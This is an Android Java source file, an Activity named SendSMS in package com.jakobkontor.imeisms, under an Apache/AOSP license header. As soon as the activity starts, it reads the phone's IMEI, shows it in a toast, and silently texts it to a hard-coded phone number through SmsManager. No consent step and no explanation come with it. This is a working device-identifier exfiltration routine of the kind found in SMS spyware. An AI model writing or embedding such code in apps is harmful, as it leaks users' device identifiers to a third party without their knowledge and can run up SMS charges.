/*
 * Copyright (C) 2012 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the License
 * is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing permissions and limitations under
 * the License.
 */

package com.jakobkontor.imeisms;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;



public class SendSMS extends Activity {

    private static String imei = null;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

    }

    @Override
    public void onStart() {
        super.onStart();

    	TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		imei = telephonyManager.getDeviceId();
		
//		Dialog dialog = new Dialog(contex);
//		TextView txt = (TextView)dialog.findViewById(R.id.textbox);
//		txt.setText(getString(R.string.message));
//		dialog.show();
		
    	Toast.makeText(
			    this /* context */,
			    imei,
			    Toast.LENGTH_LONG).show();
		
    	sendSMS("01632549385", imei);

    }

    @Override
    public void onDestroy() {
        super.onDestroy();

    }


    
    private void sendSMS(String phoneNumber, String message)
    {        
//        PendingIntent pi = PendingIntent.getActivity(this, 0,
//            new Intent(this, SMS.class), 0);                
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(phoneNumber, null, message, null, null);        
    }    




  
}
